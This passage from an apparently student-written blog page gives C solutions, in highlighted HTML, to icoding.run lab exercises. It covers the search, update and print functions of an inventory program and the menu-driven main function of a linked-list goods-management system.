class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab51.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> </span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span>* np)</span><br>&#123;<br>    <span class="hljs-type">int</span> part_number;<br>    <span class="hljs-keyword">if</span> (*np == MAX_PARTS) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Database is full; cannot add more parts.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part number:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;part_number);<br>    <span class="hljs-keyword">if</span> (find_part(part_number, inv, *np) &gt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part already exits.\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    inv[*np].number = part_number;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part name:&quot;</span>);<br>    read_line(inv[*np].name, NAME_LEN);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter quantity on hand:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;inv[*np].on_hand);<br>    (*np)++;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="03-search-函数改造"><a href="#03-search-函数改造" class="headerlink" title="03 search 函数改造"></a>03 search 函数改造</h3><blockquote><p>修改<a href="https://icoding.run/static/inventory.c">inventory.c (点击下载</a>)程序，使 inventory 和 num_parts 为 main 函数的局部变量。</p><p>本小题只需完成 <strong>search</strong> 函数的改造即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab51.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 完成人　：黄晓诚(2023090910023)</span><br><span class="hljs-comment"> * 完成时间：2023-11-07, Tue, 21:36:47</span><br><span class="hljs-comment"> * 系统评分：100</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span><br>&#123;<br>  <span class="hljs-type">int</span> i, number;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part number: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;number);<br>  i = find_part(number, inv, np);<br>  <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part name: %s\n&quot;</span>, inv[i].name);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Quantity on hand: %d\n&quot;</span>, inv[i].on_hand);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part not found.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="04-update-函数改造"><a href="#04-update-函数改造" class="headerlink" title="04 update 函数改造"></a>04 update 函数改造</h3><blockquote><p>修改<a href="https://icoding.run/static/inventory.c">inventory.c (点击下载</a>)程序，使 inventory 和 num_parts 为 main 函数的局部变量。</p><p>本小题只需完成 <strong>update</strong> 函数的改造即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab51.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span><br>&#123;<br>  <span class="hljs-type">int</span> i, number, change;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter part number: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;number);<br>  i = find_part(number, inv, np);<br>  <span class="hljs-keyword">if</span> (i &gt;= <span class="hljs-number">0</span>)<br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter change in quantity on hand: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;change);<br>    inv[i].on_hand += change;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part not found.\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="05-print-函数改造"><a href="#05-print-函数改造" class="headerlink" title="05 print 函数改造"></a>05 print 函数改造</h3><blockquote><p>修改<a href="https://icoding.run/static/inventory.c">inventory.c (点击下载</a>)程序，使 inventory 和 num_parts 为 main 函数的局部变量。</p><p>本小题只需完成 print 函数的改造即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NAME_LEN 25</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PARTS 100</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">part</span> &#123;</span><br><span class="hljs-type">int</span> number;<br><span class="hljs-type">char</span> name[NAME_LEN+<span class="hljs-number">1</span>];<br><span class="hljs-type">int</span> on_hand;<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_part</span><span class="hljs-params">(<span class="hljs-type">int</span> number, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">insert</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> *np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">update</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab51.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab51.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> part inv[], <span class="hljs-type">int</span> np)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Part Number   Part Name                  &quot;</span><br>         <span class="hljs-string">&quot;Quantity on Hand\n&quot;</span>);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; np; i++)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%7d       %-25s%11d\n&quot;</span>, inv[i].number,<br>           inv[i].name, inv[i].on_hand);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="实验六"><a href="#实验六" class="headerlink" title="实验六"></a>实验六</h2><h3 id="链表：01-软件界面控制"><a href="#链表：01-软件界面控制" class="headerlink" title="链表：01-软件界面控制"></a>链表：01-软件界面控制</h3><blockquote><p>实现一个数字选项式的启动界面，程序输入数据为（1-8），参考界面如下：</p><blockquote><ol><li>显示所有商品的信息</li><li>修改某个商品的信息</li><li>插入某个商品的信息</li><li>删除某个商品的信息</li><li>查找某个商品的信息</li><li>商品存盘并退出系统</li><li>对商品价格进行排序</li><li>(慎用)删除所有内容</li></ol><p> 其他. 不存盘并退出系统</p></blockquote><p>程序当输入1-8时，执行相关功能，完成后再次显示菜单让用户选择。当输入其它数值时，程序不存盘并退出系统。</p><p>本小题只需实现 main 函数即可，相关结构及函数声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> GOODS_FILE_NAME <span class="hljs-string">&quot;goodsinfo.txt&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_ID_LEN 30</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_NAME_LEN 30</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_PRICE_LEN 30</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_DISCOUNT_LEN 30</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">char</span> goods_id[MAX_ID_LEN];<br><span class="hljs-type">char</span> goods_name[MAX_NAME_LEN];<br><span class="hljs-type">int</span> goods_price;<br><span class="hljs-type">char</span> goods_discount[MAX_DISCOUNT_LEN];<br><span class="hljs-type">int</span> goods_amount;<br><span class="hljs-type">int</span> goods_remain;<br>&#125; GoodsInfo;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>GoodsInfo data;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span><br>&#125; GoodsList;<br><br>GoodsInfo <span class="hljs-title function_">read_goods_info</span><span class="hljs-params">()</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">init_list</span><span class="hljs-params">(GoodsList **pL)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list</span><span class="hljs-params">(GoodsList **pL)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">destory_list_and_file</span><span class="hljs-params">(GoodsList **pL)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">save_to_file</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">output_one_item</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">output_all_items</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">insert_item</span><span class="hljs-params">(GoodsList *L, GoodsInfo item, <span class="hljs-type">int</span> choice)</span>;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">delete_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span>* goods_id)</span>;<br>GoodsList* <span class="hljs-title function_">search_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span>* goods_id)</span>;<br><span class="hljs-type">bool</span> <span class="hljs-title function_">change_item</span><span class="hljs-params">(GoodsList *L, <span class="hljs-type">char</span>* goods_id, GoodsInfo new_info)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">bubble_sort</span><span class="hljs-params">(GoodsList *L)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">read_line</span><span class="hljs-params">(<span class="hljs-type">char</span> str[], <span class="hljs-type">int</span> n)</span>;<br></code></pre></td></tr></table></figure><p>该部分声明已包含在 “lab52.h”中。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 请不要删除本行头文件，否则检查不通过</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> code;<br>    GoodsList *GoodsList;<br>    init_list(&amp;GoodsList);<br>    <span class="hljs-type">char</span> id[MAX_ID_LEN];<br><br>    <span class="hljs-type">char</span> *<span class="hljs-built_in">list</span> = <span class="hljs-string">&quot;1.显示所有商品的信息\n2.修改某个商品的信息\n3.插入某个商品的信息\n4.删除某个商品的信息\n5.查找某个商品的信息\n6.商品存盘并退出系统\n7.对商品价格进行排序\n8.(慎用)删除所有内容\n其他.不存盘并退出系统&quot;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-built_in">list</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;code);<br>        <span class="hljs-keyword">switch</span> (code)<br>        &#123;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            output_all_items(GoodsList);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        &#123;<br>            read_line(id, MAX_ID_LEN);<br>            GoodsInfo newInfo = read_goods_info();<br>            change_item(GoodsList, id, newInfo);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        &#123;<br>            <span class="hljs-type">int</span> choice;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;choice);<br>            GoodsInfo newInfo = read_goods_info();<br>            insert_item(GoodsList, newInfo, choice);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>        &#123;<br>            read_line(id, MAX_ID_LEN);<br>            delete_item(GoodsList, id);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>        &#123;<br>            read_line(id, MAX_ID_LEN);<br>            search_item(GoodsList, id);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>            save_to_file(GoodsList);<br>            destory_list(&amp;GoodsList);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">// break;</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>            bubble_sort(GoodsList);<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            destory_list_and_file(&amp;GoodsList);<br>            <span class="hljs-comment">// return 0;</span><br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">default</span>:<br>            destory_list(&amp;GoodsList);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链表：02-初始化"><a href="#链表：02-初始化" class="headerlink" title="链表：02-初始化"></a>链表：02-初始化</h3><blockquote><p>函数原型：void init_list(GoodsList **L)</p><p>其中 *L 为指向链表头结点的指针，L为指向链表头结点指针的地址，init_list首先创建链表的头结点，之后读取goodsinfo.txt<a href="https://icoding.run/static/goodsinfo.txt">(示例文件下载)</a>中的商品信息，并初始化链表，函数执行后，需确保 *L 为指向链表头结点的指针。</p><p>init_list 实现商品信息链表的初始化，函数从已有的商品信息文件goodsinfo.txt<a href="https://icoding.run/static/goodsinfo.txt">(示例文件下载)</a>中读入商品信息，并且分配内存保存至链表中。<br>为了方便在表头插入和删除结点的操作，经常在表头结点（存储第一个元素的结点）的前面增加一个结点，称之为头结点或表头附加结点。这样原来的表头指针由指向第一个元素的结点改为指向头结点，头结点的数据域为空，头结点的指针域指向第一个元素的结点。</p><p>注：使用 fopen 函数打开文件时，文件名必须为 GOODS_FILE_NAME，否则检测不通过。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;lab52.h&quot;</span> <span class="hljs-comment">// 